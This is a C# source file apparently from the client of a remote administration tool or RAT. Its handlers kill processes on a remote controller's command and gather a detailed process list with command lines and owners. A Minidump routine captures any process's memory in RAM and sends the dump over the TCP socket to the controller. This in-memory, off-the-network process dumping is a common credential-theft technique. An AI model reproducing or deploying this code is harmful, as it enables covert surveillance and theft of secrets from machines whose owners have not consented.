using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using MessagePack;

namespace Client.HandlePacket
{
    internal class HandleProcess
    {
        public static void ProcessKill(string Controler_HWID, int ID)
        {
            foreach (var process in Process.GetProcesses())
                try
                {
                    if (process.Id == ID) process.Kill();
                }
                catch (Exception ex)
                {
                    Program.TCP_Socket.Log(Controler_HWID, ex.Message);
                }

            ProcessList(Controler_HWID);
        }

        public static void ProcessList(string Controler_HWID)
        {
            try
            {
                var sb = new StringBuilder();
                var query = "SELECT * FROM Win32_Process";
                using (var searcher = new ManagementObjectSearcher(query))
                using (var results = searcher.Get())
                {
                    var processes = results.Cast<ManagementObject>().Select(x => new
                    {
                        ProcessId = (uint) x["ProcessId"],
                        Name = (string) x["Name"],
                        ExecutablePath = (string) x["ExecutablePath"],
                        CommandLine = (string) x["CommandLine"],
                        ParentProcessId = (uint) x["ParentProcessId"],
                        PageFileUsage = (uint) x["PageFileUsage"],
                        VirtualSize = (ulong) x["VirtualSize"],
                        WorkingSetSize = (ulong) x["WorkingSetSize"],
                        SessionId = (uint) x["SessionId"],
                        Priority = (uint) x["Priority"]
                    });
                    foreach (var p in processes)
                        if (File.Exists(p.ExecutablePath))
                        {
                            var description = FileVersionInfo.GetVersionInfo(p.ExecutablePath).FileDescription;
                            var company = FileVersionInfo.GetVersionInfo(p.ExecutablePath).CompanyName;
                            var bit = IsWin64(Process.GetProcessById((int) p.ProcessId));
                            var owner = GetProcessUser(Process.GetProcessById((int) p.ProcessId));
                            var clr = IsCLRLoaded(Process.GetProcessById((int) p.ProcessId));

                            var icon = Icon.ExtractAssociatedIcon(p.ExecutablePath);
                            var bmpIcon = icon.ToBitmap();
                            using (var ms = new MemoryStream())
                            {
                                bmpIcon.Save(ms, ImageFormat.Png);
                                sb.Append(p.ExecutablePath
                                          + "-=>" + p.ProcessId
                                          + "-=>" + p.Name //
                                          + "-=>" + p.CommandLine
                                          + "-=>" + p.ParentProcessId //4
                                          + "-=>" + p.PageFileUsage
                                          + "-=>" + p.VirtualSize
                                          + "-=>" + p.WorkingSetSize
                                          + "-=>" + p.SessionId
                                          + "-=>" + p.Priority
                                          + "-=>" + description
                                          + "-=>" + company
                                          + "-=>" + bit
                                          + "-=>" + clr
                                          + "-=>" + owner
                                          + "-=>" + Convert.ToBase64String(ms.ToArray())
                                          + "-=>");
                            }
                        }
                }

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "process";
                msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
                msgpack.ForcePathObject("Message").AsString = sb.ToString();
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Program.TCP_Socket.Log(Controler_HWID, ex.Message);
            }
        }

        public static string IsWin64(Process process)
        {
            if (Helper.Helper.Is64Bit())
            {
                IntPtr processHandle;

                try
                {
                    processHandle = Process.GetProcessById(process.Id).Handle;
                }
                catch
                {
                    return "*";
                }

                return Native.IsWow64Process(processHandle, out var retVal) && retVal ? "x86" : "x64";
            }

            return "x86";
        }

        public static string GetProcessUser(Process process)
        {
            var processHandle = IntPtr.Zero;
            try
            {
                Native.OpenProcessToken(process.Handle, 8, out processHandle);
                var wi = new WindowsIdentity(processHandle);
                return wi.Name;
            }
            catch
            {
                return null;
            }
            finally
            {
                if (processHandle != IntPtr.Zero) Native.CloseHandle(processHandle);
            }
        }

        public static string IsCLRLoaded(Process process)
        {
            try
            {
                var modules = from module in process.Modules.OfType<ProcessModule>()
                    select module;

                return modules.Any(pm => pm.ModuleName.Contains("mscor")) ? "Manage" : "Native";
            }
            //Access was denied
            catch (Win32Exception)
            {
                return "Native";
            }
            //Process has already exited
            catch (InvalidOperationException)
            {
                return "Native";
            }
        }

        public static void Minidump(string Controler_HWID, int pid)
        {
            IntPtr targetProcessHandle;
            uint targetProcessId = 0;

            Process targetProcess = null;
            try
            {
                targetProcess = Process.GetProcessById(pid);
                targetProcessId = (uint) targetProcess.Id;
                targetProcessHandle = targetProcess.Handle;
            }
            catch (Exception)
            {
                return;
            }

            try
            {
                var byteArray = new byte[60 * 1024 * 1024];
                var callbackPtr = new Native.MinidumpCallbackRoutine((param, input, output) =>
                {
                    var inputStruct =
                        (Native.MINIDUMP_CALLBACK_INPUT) Marshal.PtrToStructure(input,
                            typeof(Native.MINIDUMP_CALLBACK_INPUT));
                    var outputStruct =
                        (Native.MINIDUMP_CALLBACK_OUTPUT) Marshal.PtrToStructure(output,
                            typeof(Native.MINIDUMP_CALLBACK_OUTPUT));
                    switch (inputStruct.CallbackType)
                    {
                        case Native.MINIDUMP_CALLBACK_TYPE.IoStartCallback:
                            outputStruct.status = Native.HRESULT.S_FALSE;
                            Marshal.StructureToPtr(outputStruct, output, true);
                            return true;
                        case Native.MINIDUMP_CALLBACK_TYPE.IoWriteAllCallback:
                            var ioStruct = inputStruct.Io;
                            if ((int) ioStruct.Offset + ioStruct.BufferBytes >= byteArray.Length)
                                Array.Resize(ref byteArray, byteArray.Length * 2);
                            Marshal.Copy(ioStruct.Buffer, byteArray, (int) ioStruct.Offset, ioStruct.BufferBytes);
                            outputStruct.status = Native.HRESULT.S_OK;
                            Marshal.StructureToPtr(outputStruct, output, true);
                            return true;
                        case Native.MINIDUMP_CALLBACK_TYPE.IoFinishCallback:
                            outputStruct.status = Native.HRESULT.S_OK;
                            Marshal.StructureToPtr(outputStruct, output, true);
                            return true;
                        default:
                            return true;
                    }
                });

                var callbackInfo = new Native.MINIDUMP_CALLBACK_INFORMATION
                {
                    CallbackRoutine = callbackPtr,
                    CallbackParam = IntPtr.Zero
                };

                var size = Marshal.SizeOf(callbackInfo);
                var callbackInfoPtr = Marshal.AllocHGlobal(size);
                Marshal.StructureToPtr(callbackInfo, callbackInfoPtr, false);

                if (Native.MiniDumpWriteDump(targetProcessHandle, targetProcessId, IntPtr.Zero, 2, IntPtr.Zero,
                        IntPtr.Zero, callbackInfoPtr))
                {
                    //Console.OutputEncoding = Encoding.UTF8;
                    //Console.Write(Convert.ToBase64String((byteArray)));
                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "processDump";
                    msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
                    msgpack.ForcePathObject("Name").AsString = targetProcess.MainModule.ModuleName;
                    msgpack.ForcePathObject("Message").SetAsBytes(byteArray);
                    Program.TCP_Socket.Send(msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                Program.TCP_Socket.Log(Controler_HWID, ex.Message);
            }
        }
    }
}